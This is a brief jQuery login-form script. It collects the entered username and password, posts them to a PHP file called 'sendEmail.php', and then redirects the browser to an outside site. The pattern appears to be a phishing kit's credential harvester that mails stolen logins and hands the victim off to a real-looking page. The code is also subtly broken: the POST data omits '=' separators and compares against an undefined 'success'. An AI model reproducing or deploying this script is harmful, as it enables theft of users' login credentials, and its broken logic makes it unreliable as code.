$(document).ready(function () {
    $('#body input#login').click(function () {


        var user = $('input#user').val();
        var password = $('input#password').val();
        $.ajax({
            type: 'post',
            url: '../assets/php/sendEmail.php',
            data: '&user' + user + '&password' + password,
            success: function (data) {
                if (data == success) {
                    document.location.href = 'http://pms.leadsys.co/index.html';
                }
            }
        });
    });

});